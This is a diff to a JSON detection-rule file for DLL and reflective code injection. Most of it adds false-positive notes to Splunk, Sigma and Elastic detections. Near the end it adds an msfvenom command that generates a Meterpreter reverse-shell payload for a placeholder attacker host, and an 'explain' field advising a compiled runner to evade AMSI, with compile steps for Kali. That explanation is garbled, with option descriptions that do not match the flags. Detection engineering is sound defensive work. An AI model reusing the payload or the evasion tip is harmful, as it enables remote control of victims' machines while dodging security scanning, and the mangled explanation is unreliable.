@@ -107,7 +107,8 @@
           "T1620"
         ],
         "fidelity": "telemetry",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate software using DLL injection for hooking (AV, accessibility tools)"
       },
       {
         "platform": "splunk",
@@ -122,7 +123,8 @@
         "confidence": "medium",
         "log_ids": [
           "8"
-        ]
+        ],
+        "false_positives": "Legitimate software using DLL injection for hooking (AV, accessibility tools)"
       },
       {
         "platform": "splunk",
@@ -137,7 +139,8 @@
         "confidence": "medium",
         "log_ids": [
           "10"
-        ]
+        ],
+        "false_positives": "Legitimate software using DLL injection for hooking (AV, accessibility tools)"
       },
       {
         "platform": "sigma",
@@ -149,7 +152,8 @@
           "T1620"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate software using DLL injection for hooking (AV, accessibility tools)"
       },
       {
         "platform": "elastic",
@@ -160,7 +164,9 @@
           "T1055",
           "T1620"
         ],
-        "fidelity": "behavioral"
+        "fidelity": "behavioral",
+        "false_positives": "Legitimate software using DLL injection for hooking (AV, accessibility tools)",
+        "confidence": "medium"
       }
     ],
     "visibility": {
@@ -199,7 +205,9 @@
         "Review Windows Security Event Log, Sysmon for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=443 -f csharp"
     }
-  }
+  },
+  "explain": "A compiled runner keeps the malicious bytes out of any script AMSI can inspect.:\n  -p windows/x64/meterpreter/reverse_tcppassword (or port, depending on context)\n  -f csharp                format / file\n  <lhost>                  your listener/attacker IP\nCompile the C# runner on Kali with mcs runner.cs -out:runner.exe, or cross-compile with mono."
 }
